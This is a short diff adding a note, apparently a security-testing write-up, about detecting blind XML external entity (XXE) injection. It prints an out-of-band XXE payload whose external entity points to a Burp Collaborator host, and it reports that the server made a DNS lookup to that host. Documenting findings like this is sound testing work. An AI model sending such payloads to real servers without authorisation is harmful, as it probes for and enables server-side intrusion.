@@ -1,0 +1,6 @@
+the application does not reveal all the information when a failure occurs, 
+
+therefore using the folloiwng OAST payload:
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://jf2nwltsw7qmbahxxvko7e6mzd54t1hq.oastify.com"> ]>
+
+I was able to get the server to send my server DNS request shwoing that a possible xxe is there.
